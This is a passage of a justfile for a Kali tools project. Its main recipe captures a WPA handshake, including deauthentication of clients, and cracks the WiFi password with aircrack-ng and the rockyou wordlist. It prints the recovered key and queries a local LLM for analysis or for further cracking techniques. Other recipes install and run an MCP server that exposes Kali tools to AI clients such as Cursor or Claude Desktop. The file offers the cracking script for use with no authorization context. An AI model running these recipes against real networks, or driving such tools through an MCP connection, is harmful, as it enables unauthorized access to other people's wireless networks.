    echo "Monitoring for handshake. When you see 'WPA handshake: [BSSID]', press Ctrl+C"
    sleep 30
    
    # Check if handshake was captured
    if [ -f "${CAP_FILE}-01.cap" ]; then
        CAP_FILE="${CAP_FILE}-01.cap"
    elif [ -f "$CAP_FILE.cap" ]; then
        CAP_FILE="$CAP_FILE.cap"
    fi
    
    # Stop background processes
    kill $AIRODUMP_PID 2>/dev/null || true
    kill $AIREPLAY_PID 2>/dev/null || true
    
    echo ""
    echo "Step 3: Checking for handshake..."
    if aircrack-ng "$CAP_FILE" | grep -q "1 handshake"; then
        echo "✓ Handshake captured successfully!"
        
        # Extract handshake
        if [ -f "$CAP_FILE" ]; then
            cp "$CAP_FILE" "$HANDSHAKE_FILE"
        fi
        
        echo ""
        echo "Step 4: Cracking password with wordlist..."
        echo "This may take a while depending on wordlist size..."
        echo ""
        
        # Crack the password
        CRACK_OUTPUT=$(mktemp)
        if aircrack-ng -w "$WORDLIST" -b {{BSSID}} "$CAP_FILE" > "$CRACK_OUTPUT" 2>&1; then
            # Extract password from aircrack-ng output (handles various formats)
            PASSWORD=$(grep -i "KEY FOUND" "$CRACK_OUTPUT" | sed -n 's/.*\[\(.*\)\].*/\1/p' | tr -d ' ' | head -n1 || echo "")
            
            if [ -n "$PASSWORD" ]; then
                echo "=========================================="
                echo "✓ PASSWORD CRACKED!"
                echo "=========================================="
                echo "BSSID: {{BSSID}}"
                echo "Password: $PASSWORD"
                echo "=========================================="
                
                # Optionally send to LocalAI for analysis
                if curl -s http://localhost:{{PORT}}/health >/dev/null 2>&1; then
                    echo ""
                    echo "Analyzing with LocalAI..."
                    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
                        -H "Content-Type: application/json" \
                        -d "{
                            \"model\": \"llama-3-8b\",
                            \"messages\": [
                                {\"role\": \"system\", \"content\": \"You are a WiFi security expert.\"},
                                {\"role\": \"user\", \"content\": \"I successfully cracked a WiFi password. BSSID: {{BSSID}}, Password strength analysis and security recommendations?\"}
                            ],
                            \"temperature\": 0.3
                        }" | jq -r '.choices[0].message.content' || true
                fi
            else
                echo "Password not found in wordlist."
                echo "Try a different wordlist or use a larger dictionary."
                
                # Get AI suggestions
                if curl -s http://localhost:{{PORT}}/health >/dev/null 2>&1; then
                    echo ""
                    echo "Getting AI suggestions..."
                    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
                        -H "Content-Type: application/json" \
                        -d "{
                            \"model\": \"llama-3-8b\",
                            \"messages\": [
                                {\"role\": \"system\", \"content\": \"You are a WiFi security expert.\"},
                                {\"role\": \"user\", \"content\": \"Password not found in wordlist. What are alternative cracking techniques or better wordlists to try?\"}
                            ],
                            \"temperature\": 0.4
                        }" | jq -r '.choices[0].message.content' || true
                fi
            fi
        else
            echo "Cracking failed. Check the output for errors."
            cat "$CRACK_OUTPUT"
        fi
        
        rm "$CRACK_OUTPUT"
    else
        echo "✗ Handshake not captured. Try again or wait longer."
        echo "You may need to:"
        echo "1. Wait for a device to connect"
        echo "2. Send more deauth packets"
        echo "3. Check if you're close enough to the access point"
    fi
    
    # Cleanup: stop monitor mode
    echo ""
    echo "Cleaning up..."
    airmon-ng stop "$MON_INTERFACE" >/dev/null 2>&1 || true
    
    echo "Done. Capture file saved: $CAP_FILE"

# Quick WiFi crack with default wordlist
crack-wifi-quick INTERFACE BSSID:
    #!/usr/bin/env bash
    echo "Using default wordlist (rockyou.txt)..."
    just crack-wifi {{INTERFACE}} {{BSSID}} ./rockyou.txt

# Install MCP Kali Tools Server
install-mcp-server:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Installing MCP Kali Tools Server..."
    
    # Function to get privilege escalation command
    get_priv_cmd() {
        if [ "$(id -u)" = "0" ]; then
            echo ""
        elif command -v doas >/dev/null 2>&1; then
            echo "doas"
        elif command -v sudo >/dev/null 2>&1; then
            echo "sudo"
        else
            echo "ERROR"
        fi
    }
    
    # Check if Python 3 is available
    if ! command -v python3 >/dev/null 2>&1; then
        echo "Installing Python 3..."
        if command -v apk >/dev/null 2>&1; then
            PRIV_CMD=$(get_priv_cmd)
            if [ "$PRIV_CMD" = "ERROR" ]; then
                echo "ERROR: Need root privileges to install Python 3. Install doas/sudo or run as root."
                exit 1
            elif [ -z "$PRIV_CMD" ]; then
                apk add --no-cache python3 py3-pip
            else
                $PRIV_CMD apk add --no-cache python3 py3-pip
            fi
        else
            echo "ERROR: Please install Python 3 manually"
            exit 1
        fi
    fi
    
    # Make script executable
    chmod +x mcp-kali-server.py
    
    # Create symlink in /usr/local/bin
    if [ -f "mcp-kali-server.py" ]; then
        PRIV_CMD=$(get_priv_cmd)
        if [ "$PRIV_CMD" = "ERROR" ]; then
            echo "ERROR: Need root privileges to create symlink. Install doas/sudo or run as root."
            exit 1
        elif [ -z "$PRIV_CMD" ]; then
            ln -sf "$(pwd)/mcp-kali-server.py" /usr/local/bin/mcp-kali-server
        else
            $PRIV_CMD ln -sf "$(pwd)/mcp-kali-server.py" /usr/local/bin/mcp-kali-server
        fi
        echo "✓ MCP server installed at /usr/local/bin/mcp-kali-server"
    else
        echo "ERROR: mcp-kali-server.py not found"
        exit 1
    fi
    
    echo "MCP server installation complete!"
    echo ""
    echo "Usage:"
    echo "  mcp-kali-server"
    echo ""
    echo "Or configure in your MCP client (e.g., Cursor/Claude Desktop):"
    echo '  {'
    echo '    "mcpServers": {'
    echo '      "kali-tools": {'
    echo '        "command": "python3",'
    echo '        "args": ["/path/to/mcp-kali-server.py"]'
    echo '      }'
    echo '    }'
    echo '  }'

# Run MCP Kali Tools Server
run-mcp-server:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Starting MCP Kali Tools Server..."
    
    if [ ! -f "mcp-kali-server.py" ]; then
        echo "ERROR: mcp-kali-server.py not found"
        exit 1
    fi
    
    if ! command -v python3 >/dev/null 2>&1; then
        echo "ERROR: Python 3 not found. Install with: just install-mcp-server"
        exit 1
    fi
    
    python3 mcp-kali-server.py

